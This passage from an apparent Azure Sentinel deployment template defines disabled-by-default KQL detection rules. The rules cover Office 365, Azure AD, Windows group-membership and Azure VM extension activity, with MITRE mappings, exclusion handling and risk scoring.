          "description": "This will help you determine if mailbox login was done from Exchange Powershell session. By default, all accounts you create in Office 365 are allowed to use Exchange Online PowerShell. Administrators can use Exchange Online PowerShell to enable or disable a user's ability to connect to Exchange Online PowerShell. Whitelist any benign scheduled activities using Exchange PowerShell if applicable in your environment. MITRE: T1187,T1204 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where Operation == 'MailboxLogin'\n| where UserId matches regex EXCLUDED_USER_ACCOUNTS == false\n| where ClientInfoString == 'Client=Microsoft.Exchange.Powershell; Microsoft WinRM Client'\n| summarize count(), min(TimeGenerated), max(TimeGenerated) by Operation, OrganizationName, UserType, UserId, MailboxOwnerUPN, Logon_Type, ClientInfoString\n| extend AccountCustomEntity = UserId",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Execution"
          ],
          "techniques": [
            "T1187",
            "T1204"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11130')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11130')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11130: [RBA] O365 - SharePoint Sharing Policy Changed",
          "description": "This alert identifies when a SharePoint sharing policy has been modified MITRE: T1078,T1114 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet start_time_historical = 60m;\nlet end_time_historical = 10m;\nlet alert_bin = 30m;\nlet end_time = now();\nOfficeActivity\n//| where TimeGenerated > ago(30d)\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventSource == \"SharePoint\"\n| where Operation == \"SharingPolicyChanged\"\n| extend \n    bv_src_user = UserId\n    , bv_src_ip = ClientIP\n    , bv_object = OfficeObjectId\n| mv-apply e = todynamic(ModifiedProperties) on ( \n    extend bv_object_attr = e.Name\n    | summarize bv_object_attr = make_set(bv_object_attr)\n)\n| parse bv_src_user with bv_src_user_name '@' bv_src_user_domain\n| extend bv_src_user_entity = coalesce(bv_src_user_name, bv_src_user)\n| extend \n    bv_object_category = 'app'\n    , bv_object_attr_category = 'access'\n    , bv_vendor_action = Operation\n    , bv_vendor_object_attr = ModifiedProperties\n    , AttackerEntity = pack_array(bv_src_ip, bv_src_user_entity)\n    , RBAScore = BV11130_CONFIG['RBASCORE']\n| mv-apply e = BV11130_CONFIG['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_src_ip_excluded = iff(bv_src_ip contains e.bv_src_ip and isnotempty(e.bv_src_ip), 1, 0)\n        | extend bv_object_excluded = iff(bv_object contains e.bv_object and isnotempty(e.bv_object), 1, 0)\n        | extend bv_object_attr_excluded = iff(bv_object_attr contains e.bv_object_attr and isnotempty(e.bv_object_attr), 1, 0)\n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_src_ip_excluded            + bv_object_excluded            + bv_object_attr_excluded       | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)\n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or (ExcludedEvent == true and transparent != 0)\n| extend ExtendedDescription = strcat(\n        'bv_src_user: ', bv_src_user, '\\n' \n        , 'bv_src_ip: ', bv_src_ip, '\\n' \n        , 'bv_object: ', bv_object, '\\n' \n        , 'bv_object_attr: \\n* ', strcat_array(bv_object_attr, '\\n* '), '\\n\\n' \n        , 'RBAScore: ', RBAScore)\n| project \n    bv_start_time = TimeGenerated\n    , bv_alarm_time = now()\n    , bv_src_user\n    , bv_src_ip\n    , bv_object_attr\n    , bv_object\n    , bv_object_attr_category\n    , bv_object_category\n    , bv_vendor_action\n    , bv_vendor_object_attr\n    , AttackerEntity\n    , RBAScore\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies when a SharePoint sharing policy has been modified  \n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11060')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11060')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11060: [RBA] O365 - Sharepoint Sites Modification",
          "description": "This alert identifies Sharepoint site changes via Office 365 logs MITRE: T1213 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet exclusion_fields = datatable (\n    bv_src_user:string \n    , bv_vendor_category: string\n)[];\nlet exclusions = ( T:(\n    bv_src_user:string\n    , bv_vendor_category: string    \n    )\n    , Exclusion: dynamic) {\n    T\n    | mv-apply e = Exclusion on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_array = split(e.bv_src_user, ',')\n        | mv-apply f = bv_src_user_array on ( \n            extend bv_src_user_excluded = iff(tolower(bv_src_user) contains tolower(f) and isnotempty(f), true, false)\n            | summarize bv_src_user_excluded = countif(bv_src_user_excluded)\n            | extend bv_src_user_excluded = iff(bv_src_user_excluded > 0 , 1, 0)\n        )\n    | extend bv_vendor_category_excluded = iff(bv_vendor_category contains e.bv_vendor_category and isnotempty(e.bv_vendor_category), 1, 0)           \n    | extend excluded_count = \n                  bv_src_user_excluded\n                  + bv_vendor_category_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n    | project-away excluded\n};         \nOfficeActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation in~ ('RemovedFromSiteCollection', 'SiteCollectionAdminAdded', 'SiteCollectionAdminRemoved', 'SiteAdminPermissionsRequested')\n| extend \n    bv_src_user = tolower(UserId)\n    , bv_vendor_action = tolower(Operation)\n    , bv_object = OfficeObjectId\n    , bv_src_ip = ClientIP\n    , bv_vendor_category = OfficeWorkload\n| union exclusion_fields | invoke exclusions(BV11060_CONFIGURATION['EXCLUSION']) \n| where not(ExcludedEvent)\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_unique_object_cnt = dcount(bv_object)\n      , bv_vendor_action = make_set(bv_vendor_action)\n      , bv_src_ip = make_set(bv_src_ip)\n      , bv_object = make_set(bv_object)\n      , bv_vendor_category = make_set(bv_vendor_category)\n    by \n      bv_src_user\n| where bv_unique_object_cnt > BV11060_CONFIGURATION['EVENT_THRESHOLD']\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_vendor_action: \\n* ', strcat_array(bv_vendor_action, '\\n* ')            \n      , '\\nbv_object: \\n* ', strcat_array(bv_object, '\\n* ')\n      , '\\nbv_src_ip: \\n* ', strcat_array(bv_src_ip, '\\n* ')\n      , '\\nbv_vendor_category: \\n* ', strcat_array(bv_vendor_category, '\\n* ')                                      \n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_vendor_action\n      , bv_object\n      , bv_src_ip\n      , bv_unique_object_cnt\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11060_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies Sharepoint site changes via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-205')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-205')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-205: [Hygiene] Azure AD - Excessive Failures",
          "description": "Accounts recorded with 50 or more failures in one day. MITRE: T1110 Category: Azure AD tag: Hygiene",
          "severity": "Medium",
          "enabled": false,
          "query": "SigninLogs\n| where TimeGenerated >= ago(1d)\n| where toint(ResultType) > 0\n| where AppDisplayName !in~ (WHITELISTED_AUTH_APPS)\n| where tolower(UserPrincipalName) matches regex tolower(A205_WHITELISTED_USER_PRINCIPAL_NAME) == false\n| where tolower(ConditionalAccessPolicies) matches regex tolower(A205_WHITELISTED_POLICY) == false\n| summarize Count=count(), First=min(TimeGenerated), Last=max(TimeGenerated), ClientApps=make_set(ClientAppUsed, 5), Apps=make_set(AppDisplayName, 5) by AccountCustomEntity = UserPrincipalName, ResultDescription, IPCustomEntity = IPAddress, Location\n| sort by Count desc\n| where Count >= 50 and AccountCustomEntity contains '@'",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11345')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11345')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11345: [RBA] Windows - Account Added To Group By Same Account",
          "description": "This alert identifies an account that has added itself to another group MITRE: T1098 Category: Windows Security tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "let EventIDList = dynamic([4728, 4732, 4756]);    \nlet start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet start_time_historical = 1d;\nlet UserInfo = \nunion isfuzzy=true\n(SigninLogs\n  | where TimeGenerated between (ago(start_time_historical) .. end_time)\n  | summarize by UserDisplayName, UserPrincipalName\n  | parse UserPrincipalName with bv_src_user '@' bv_src_domain\n  | extend bv_src_user = tolower(bv_src_user)\n  | extend FName = extract(@'^([^(]*)', 1, UserDisplayName)\n  | extend User_FullName = trim(@\"[^\\w]+\", tolower(FName))\n),\n(\nIdentityInfo\n  |where TimeGenerated between (ago(start_time_historical) .. end_time)\n  | summarize by AccountDisplayName, AccountUPN\n  | parse AccountUPN with bv_src_user '@' bv_src_domain\n  | extend bv_src_user = tolower(bv_src_user)\n  | extend FName = extract(@'^([^(]*)', 1, AccountDisplayName)\n  | extend User_FullName = trim(@\"[^\\w]+\", tolower(FName))\n)\n| summarize by bv_src_user, bv_user_fullname = User_FullName\n;      \nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID  in (EventIDList)\n| extend \n      bv_src_user     = tolower(extract(@'([^\\W]*)$', 1, SubjectUserName))\n      , bv_src_dvc    = Computer\n      , bv_event_id   = EventID\n      , bv_start_time = TimeGenerated\n      , bv_workstation = WorkstationName\n      , bv_dest_user = tolower(extract(@'CN=([^=]*),', 1, MemberName))\n      , bv_group = TargetUserName\n      , bv_group_sid = TargetSid\n      , bv_activity = Activity\n| extend bv_src_user = iff(isempty(bv_src_user), tolower(SubjectUserName), bv_src_user)\n| mv-apply e = BV11345_CONFIGURATION['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_group_excluded = iff(bv_group contains e.bv_group and isnotempty(e.bv_group), 1, 0)\n        | extend bv_group_sid_excluded = iff(bv_group_sid contains e.bv_group_sid and isnotempty(e.bv_group_sid), 1, 0)\n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_group_excluded\n                + bv_group_sid_excluded\n        | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true) \n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or not(ExcludedEvent == true and transparent == 0)\n| join kind=inner UserInfo on bv_src_user\n| where bv_user_fullname == bv_dest_user\n| summarize \n      bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_group = make_set(bv_group)\n      , bv_group_sid = make_set(bv_group_sid)\n      , bv_dest_user = make_set(bv_dest_user)\n      , bv_activity = make_set(bv_activity)\n    by \n      bv_src_user\n| extend VictimEntity = bv_dest_user\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_dest_user: \\n* ', strcat_array(bv_dest_user, '\\n* ')            \n      , '\\nbv_activity: \\n* ', strcat_array(bv_activity, '\\n* ')\n      , '\\nbv_group: \\n* ', strcat_array(bv_group, '\\n* ')                                 \n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_dest_user\n      , bv_group\n      , bv_group_sid\n      , bv_activity\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11345_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies an account that has added itself to another group\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1098"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1622')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1622')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1622: [RBA] AzureActivity - Modify VM Extension",
          "description": "This alerts when there's any modification to Azure VM extensions MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1622_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1622_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nAzureActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where ResourceId has \"/extensions/enablevmaccess\" and ActivityStatus =~ 'Succeeded'\n| parse ResourceId with * '/virtualMachines/' bv_src_dvc '/extensions/' *\n| extend bv_raw = pack_all()\n| project \n    bv_user = Caller\n    , bv_src_user = Caller\n    , bv_src_ip = CallerIpAddress\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc\n    , bv_alert_time = now()\n    , bv_vendor_product = 'AzureActivity'\n    , sourcetype = 'AzureActivity'\n    , bv_raw\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1622')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = pack_array(bv_cim_normalize_username(bv_user))\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription           ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1622: [RBA] AzureActivity - Modify VM Extension",
            "alertDescriptionFormat": "This alerts when there's any modification to Azure VM extensions\n\n{{ExtendedDescription}}\n\nMITRE: T1578\nCategory: Azure Activity\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-116')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-116')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-116: [RBA] Azure AD - NewCredentialAddedToSPN",
          "description": "Alerts when an admin or app owner account adds a new credential to an Application or Service Principal. \nIf a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential. \nAdditional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow MITRE: T1098 Category: Azure AD tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "let ingested_lookback = 10m; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nlet alert_bin =10m;\nAuditLogs\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| where ingestion_time() > ago(ingested_lookback)\n| where OperationName has_any ('Add service principal', 'Certificates and secrets management') \n| where Result =~ 'success'\n| where tostring(InitiatedBy.user.userPrincipalName) has '@' or tostring(InitiatedBy.app.displayName) has '@'\n| extend targetDisplayName = tostring(TargetResources[0].displayName)\n| extend targetId = tostring(TargetResources[0].id)\n| extend targetType = tostring(TargetResources[0].type)\n| extend keyEvents = TargetResources[0].modifiedProperties\n| where keyEvents has 'KeyIdentifier=' and keyEvents has 'KeyUsage=Verify'\n| mv-expand keyEvents\n| where keyEvents.displayName =~ 'KeyDescription'\n| parse keyEvents.newValue with * 'KeyIdentifier=' keyIdentifier: string ',KeyType=' keyType: string ',KeyUsage=' keyUsage: string ',DisplayName=' keyDisplayName: string ']' *\n| parse keyEvents.oldValue with * 'KeyIdentifier=' keyIdentifierOld: string ',KeyType' *\n| where keyEvents.oldValue == '[]' or keyIdentifier != keyIdentifierOld\n| where keyUsage == 'Verify'\n| extend UserAgent = iff(AdditionalDetails[0].key == 'User-Agent', tostring(AdditionalDetails[0].value), '')\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| project-away keyEvents\n| summarize \n    